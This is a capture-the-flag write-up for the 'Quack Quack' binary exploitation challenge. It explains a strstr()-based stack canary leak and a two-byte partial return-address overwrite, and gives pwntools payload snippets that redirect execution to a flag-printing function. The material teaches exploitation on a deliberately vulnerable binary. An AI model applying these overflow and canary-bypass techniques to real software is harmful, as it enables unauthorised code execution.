# Quack Quack Challenge Writeup

## Challenge Overview

The "Quack Quack" challenge involves a binary exploitation vulnerability in a program themed around ducks. This is a stack buffer overflow challenge with two key twists: exploiting the behavior of the `strstr()` function to leak stack data, and dealing with a partial overwrite of the return address due to limited write capability.

## Binary Analysis

Let's review the target binary's properties:

- Architecture: 64-bit (amd64)
- Protections:
  - RELRO: Full
  - Stack: Canary enabled
  - NX: Enabled
  - PIE: Disabled (base address fixed at 0x400000)
  - SHSTK & IBT: Enabled

The main functionality is in the `duckling()` function:

```c
void duckling() {
  char buf[32];
  char v3[80]; // Second buffer
  // Initialize buffers to zero
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, sizeof(v3));
  
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0, buf, 0x66);  // Read up to 102 bytes into a 32-byte buffer!
  
  char* v1 = strstr(buf, "Quack Quack ");
  if (!v1) {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6a);  // Read up to 106 bytes into an 80-byte buffer
  puts("Did you really expect to win a fight against a Duck?!\n");
}
```

The program also contains an unconnected `duck_attack()` function that reads and outputs the content of "flag.txt".

## The Core Vulnerabilities

After careful analysis, we can identify two key vulnerabilities:

### 1. The `strstr()` Pointer Manipulation

The most crucial vulnerability is in how the program uses `strstr()` and pointer arithmetic:

```c
char* v1 = strstr(buf, "Quack Quack ");
printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```

When `strstr()` finds the substring "Quack Quack ", it returns a pointer to the beginning of that substring within the buffer. The program then adds 32 to this pointer (`v1 + 32`) before passing it to `printf()`.

**The key insight**: If we position "Quack Quack " at the very end of our controlled buffer, the `v1 + 32` will point past our buffer and into the stack, potentially exposing stack values including the canary!

### 2. Buffer Overflow with Limited Write

The second vulnerability is the classic buffer overflow in both reads:
- First read: 102 bytes into a 32-byte buffer
- Second read: 106 bytes into an 80-byte buffer

However, the limited size of these overflows means we can only partially overwrite the return address - specifically, we can only control the lower 2 bytes of the return address.

## Exploitation Strategy

The exploitation requires carefully chaining these vulnerabilities:

1. **Leak the canary**: Position "Quack Quack " precisely so that `v1 + 32` points to stack data containing the canary
2. **Bypass the canary**: Use the leaked canary in our second payload to avoid triggering stack protection
3. **Partial return address overwrite**: Since we can only write 2 bytes to the return address, we need to use those bytes to redirect execution to `duck_attack()` (0x40137f)

## Detailed Exploitation

### Step 1: Leaking the Canary

The critical part is finding the perfect offset to position "Quack Quack " so that `v1 + 32` points to the canary or other useful stack data:

```python
# First payload to leak the canary
target.recvuntil(b"> ")
first_payload = b"A" * 89 + b"Quack Quack "  # Precisely positioned!
target.sendline(first_payload)
```

What happens here:
1. We fill 89 bytes with 'A's
2. Then place "Quack Quack " at the end
3. This makes `strstr()` return a pointer to byte 89
4. Then `v1 + 32` points to byte 121, which is past our buffer and into stack data
5. When `printf()` prints from this address, it leaks stack values including the canary

```
Memory Layout:
[buffer (32 bytes)][overflow area][saved registers][canary][saved rbp][return addr]
                   ^             ^                 ^
                   |             |                 +-- What we want to leak
                   |             +-- Where v1+32 points to with the right offset
                   +-- Where our "Quack Quack " is placed
```

### Step 2: Extracting and Using the Canary

Once we get the response containing the leaked data:

```python
# Get response with leaked canary bytes
response = target.recvuntil(b"> ", drop=True)
leak = response.split(b'Quack Quack ')[1].split(b', ready')[0]

# Stack canaries start with a null byte, which we didn't leak
full_canary = b'\x00' + leak[:7]
canary = u64(full_canary)
```

### Step 3: Partial Return Address Overwrite

Now for the second buffer overflow, we can only control the lower 2 bytes of the return address:

```python
# Craft the second payload to execute duck_attack (address 0x40137f)
second_payload = b"A" * 88 + p64(canary) + b"B" * 8 + b"\x7f\x13"
target.sendline(second_payload)
```

What's happening here:
1. Fill the buffer with 88 bytes of padding
2. Place the exact canary value we leaked
3. Add 8 more bytes for saved RBP
4. Overwrite just the lower 2 bytes of the return address with "\x7f\x13"

The "\x7f\x13" bytes correspond to the lower bytes of the address 0x40137f (the `duck_attack()` function). Since the binary is not PIE-enabled, the higher bytes of the address remain 0x0040, allowing our partial overwrite to successfully redirect execution.

## Key Insights

1. **The `strstr()` + 32 Vulnerability**: The critical insight was understanding that the `v1 + 32` pointer arithmetic could be manipulated to point outside of our controlled buffer and into stack memory.

2. **Buffer Structure Analysis**: Careful analysis of the stack layout was necessary to position "Quack Quack " at exactly the right offset to leak useful data.

3. **Partial Overwrite Technique**: Understanding that even though we could only control 2 bytes of the return address, this was sufficient due to the non-PIE nature of the binary and the favorable address of `duck_attack()`.

## Conclusion

This challenge combines several interesting binary exploitation concepts:
- Pointer manipulation to leak stack data
- Stack canary bypass through information leakage
- Partial return address overwrite

The most elegant aspect of this exploit is how it leverages the `strstr()` behavior and pointer arithmetic to turn what seems like a simple text-processing vulnerability into a powerful information leak that enables the rest of the attack.

Flag: (The flag would be obtained by running the exploit against the actual challenge server)
